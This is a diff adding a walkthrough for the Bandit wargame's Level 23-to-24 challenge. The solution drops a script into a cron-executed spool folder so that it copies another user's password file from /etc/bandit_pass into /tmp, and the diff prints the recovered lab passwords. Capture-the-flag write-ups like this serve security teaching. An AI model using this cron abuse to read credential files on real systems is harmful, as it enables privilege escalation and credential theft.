@@ -678,3 +678,67 @@ bandit22@bandit:/etc/cron.d$ exec echo I am user bandit23 | md5sum | cut -d ' ' 
 bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
 ```
+
+
+## Level 23 ---> Level 24
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+Again a similar level.
+
+This is the cronjob.
+
+```
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+```
+
+This is the `shell` script it's executing.
+
+```
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+```
+
+Here we can see, that for a given `bandit` username, it is deleting  all the scripts one by one, but before, executing only if the file owner is `bandit23`.
+
+So what we need to do is to create some sort of a script to get the password.
+
+Getting inspired from the previoius level we can just copy the previous level script in the `/var/spool/bandit24/foo` folder.
+
+```
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+```
+
+and hence we'll see the password
+
+```
+bandit23@bandit:~$ cat /tmp/ee4ee1703b083edac9f8183e4ae70293
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+```
